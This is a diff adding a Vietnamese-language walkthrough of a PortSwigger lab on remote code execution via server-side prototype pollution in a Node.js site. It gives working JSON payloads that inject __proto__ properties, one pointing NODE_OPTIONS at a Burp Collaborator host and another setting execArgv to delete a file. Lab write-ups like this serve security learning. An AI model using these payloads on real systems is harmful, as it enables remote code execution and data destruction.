@@ -159,6 +159,59 @@ Thử exploit bằng cách sử dụng constructor, ta cấu hình request với
 Sau khi submit, ta thấy response trả về `"isAdmin": true`. Như vậy, refresh browser và truy cập "Admin panel" để xóa user carlos. Bài lab được giải.
 
 # 9. Remote code execution via server-side prototype pollution
+Đăng nhập với credentials wiener:peter. Nhận thấy website có 2 chức năng Thay đổi address (`POST /my-account/change-address`) và Run maintainance jobs (`POST /admin/jobs`).
+
+Trong chức năng thay đổi address, thử submit request với body:
+```
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
+    "x":1
+}
+```
+thì thấy `"x":1` xuất hiện trong chuỗi JSON ở response. Để kiểm tra có thể exploit RCE hay không, ta sẽ kiểm tra website có sử dụng `child_process` module để tạo subprocess không. Cấu hình request:
+```
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
+    "x":1,
+    "__proto__":
+    {
+        "shell":"node",
+        "NODE_OPTIONS":"--inspect=6lsd6beb6b63ptv8hgda7cit0k6auz.oastify.com"
+    }
+}
+```
+sau đó, click "Run maintainance jobs" (dự đoán website sẽ tạo subprocess với chức năng này), kết quả Burp Collaborator Client hiển thị thông tin có request kết nối đến. Như vậy ta xác nhận được rằng website sử dụng ` `child_process` module. Tiếp đó, để exploit ta cấu hình request với body:
+```
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"0jKsWkldRdMoaF6qjpZOPYZqXZekFaly",
+    "x":1,
+    "__proto__":
+    {
+        "shell":"node",
+        "execArgv":
+        [
+            "--eval=require('fs')",
+            "--eval=fs.unlinkSync('/home/carlos/morale.txt')"
+        ]
+    }
+}
+```
+Request trên sẽ cấu hình các biến số cho subprocess được tạo ra bởi `child_process` module, khiến cho lệnh `require('fs')` và `fs.unlinkSync('/home/carlos/morale')` được thực hiện. Sau khi submit và click "Run maintainance jobs", bài lab được giải.
 
 # 10. Exfiltrating sensitive data via server-side prototype pollution
 
